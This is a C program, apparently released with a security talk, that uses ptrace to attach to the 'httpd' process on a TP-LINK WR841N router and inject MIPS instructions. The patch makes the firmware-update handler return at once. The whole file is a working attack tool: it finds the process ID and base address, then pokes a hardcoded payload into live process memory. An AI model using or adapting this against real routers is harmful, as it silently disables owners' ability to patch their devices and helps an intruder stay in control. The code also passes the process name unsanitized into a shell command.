#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <errno.h>

/*
 * This is the relative offset (from the base address) on which we are
 * planning to inject our instructions payload. It is the firstafter 
 * address after the 'http_rpm_update' function prologue ends.
 *
 * It is defined here because we cannot expect the base address to be the
 * same every time (despite this being the case in our talk target). So we
 * are using it to retrieve the absolute memory address on which to inject
 * dinamically by doing BASE_ADDRESS + OFFSET_AFTER_PROLOGUE.
 *
 * In the TP-LINK WR841N Router (Hardware v13.1) the absolute address we is
 * are talking about is always 0x00407d40 (Yes, there is no ASLR in our target).
 * If you follow this address, you will find the following instruction in there
 * 'bne v0, v1, 0x00407d5c'.
 *
 */
#define OFFSET_AFTER_PROLOGUE 0x7D40;

int inject(pid_t pid, char *src, void *dst, int len);
void* get_base_address(char* process_name);
int get_pid(char* process_name);

/*
 * INSTRUCTIONS: j 0x00407f4c
 *               nop
 *
 * OPCODES: d31f100800000000
 *
 * By injecting this instructions after the function prologue we expect to
 * jump directly to the end of it, always redirecting to the 'jr ra' call
 * that is made after the epilogue and, therefore, disabling the firmware 
 * update feature by always returning to the caller function without doing
 * anything.
 *
 * The 'nop' injection is required because in MIPS architectures, the jump ('j')
 * instructions take two cycles to actually jump and the instruction below
 * it is always executed before actually doing so.
 */
char payload[] = {0xd3,0x1f,0x10,0x08,0x00,0x00,0x00,0x00,0x00};

void main(int argc, char *argv[])
{

    if (argc != 2){
        fprintf(stderr, "Usage:\n\t%s RUNNING_PROCESS_NAME\n", argv[0]);
        exit(1);
    }

    void* base_address;
    void* func_ptr;
    int pid;
    int i =0;

    /*
     * We get both the PID and the BASE_ADDRESS of our victim process ('httpd').
     */
    pid = get_pid(argv[1]);
    base_address = get_base_address(argv[1]);

    /*
     * By doing this operation, we expect to get the absolute address on which
     * our payload will be injected, as specified earlier in the comments. For
     * our target, we expect this to be 0x00407d40.
     */
    func_ptr = base_address + OFFSET_AFTER_PROLOGUE;

    //printf("base_address: %p\n", base_address);
    //printf("func_ptr: %p\n", func_ptr);

    /*
     * We attach to the the specified victim process ('httpd' in our case).
     */
    //printf("[INFO] Attaching to process %d\n", pid);
    if ((ptrace(PTRACE_ATTACH, pid, NULL, NULL)) < 0){
        printf("[ERROR] Unexpected error while attaching to process (PID %d): %s\n", pid, strerror(errno));
        exit(1);
    }

    /*
     * To be sure that we are ready to interact with a the stopped process,
     * we wait until a SIGSTOP signal is received.
     */
    //printf("[INFO] Waiting for process to stop after SIGSTOP signal ...\n");
    wait(NULL);

    /*
     * We call the 'inject(...)' funtion in order to start the instructions
     * injection phase.
     */
    //printf("[INFO] Trying to inject into PID: %d \n", pid);
    if(inject(pid, &payload, func_ptr, 8) < 0){
        exit(1);
    }

    /*
     * After injecting our payload in the expected address, we must ensure that
     * the victim process can continue its jorney working as it did before the
     * attack took place. In order to do so, we call 'ptrace(...)' to let it
     * go on and we detach from it.
     */
    //printf("[INFO] Ensuring process %d continuity!\n", pid);
    if ((ptrace(PTRACE_CONT, pid, NULL, NULL)) < 0){
        printf("[ERROR] Unexpected error while trying to resume process activity!\n");
        exit(1);
    }

    //printf("[INFO] Detaching from process %d\n", pid);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);

    //printf("Process successfully ended!\n");

}

/* FUNCTION: inject(...)
 * OBJECTIVE: Inject instructions in a given process memory region
 * ARGUMENTS: The PID of the process on which to inject - pid_t pid
              A pointer to the data that will be injected - char* src
              A pointer of where to write the given data - void* dst
              A number specifying the number of bytes to write in the given memory address - int len
 * RETURNS: -1 if the injection process failed
             0 if the injection process was successful
 */
int inject(pid_t pid, char *src, void *dst, int len){
    int i;
    u_int32_t *source = (u_int32_t *) src;
    u_int32_t *destination = (u_int32_t *) dst;

    for(i=0; i < len; i+=4, source++, destination++){
        //printf("[INFO] Already inside inject() function\n");
        if ((ptrace(PTRACE_POKETEXT, pid, destination, *source)) < 0){
            printf("[ERROR] Unexpected error while injecting the shellcode!. errno: %s\n", strerror(errno));
            return -1;
        }
    }
    return 0;
}

/* FUNCTION: get_base_address(...)
 * OBJECTIVE: Retrieve the Base Address of a given process name from its '/proc/PID/maps' file.
 * ARGUMENTS: The process name - char* process_name
 * RETURNS: Memory base address of the specified process - void* baddr
 */
void* get_base_address(char* process_name){
    FILE *fs;
    char proc_path[20];
    char baddr_aux[20];
    void* baddr;
    int pid;

    pid = get_pid(process_name);

    snprintf(proc_path, 20, "/proc/%d/maps", pid);

    fs = fopen(proc_path, "r");
    fgets(baddr_aux, 9, fs);

    //printf("%s\n",baddr_aux);

    sscanf(baddr_aux, "%p", &baddr);

    return baddr;
}

/* FUNCTION: get_pid(...)
 * OBJECTIVE: Retrieve the PID of a running process given its name
 * ARGUMENTS: The process name - char* process_name
 * RETURNS: The process PID - int pid
 */
int get_pid(char* process_name){

    char run_proc_string[20];
    char pidline[1024];
    char* pid_string;
    int pid_number;

    snprintf(run_proc_string, 20, "pidof %s", process_name);

    FILE *fp = popen(run_proc_string,"r");

    fgets(pidline,1024,fp);

    pid_string = strtok(pidline," ");

    pid_number = atoi(pid_string);

    pid_string = strtok(NULL , " ");

    pclose(fp);

    return pid_number;
}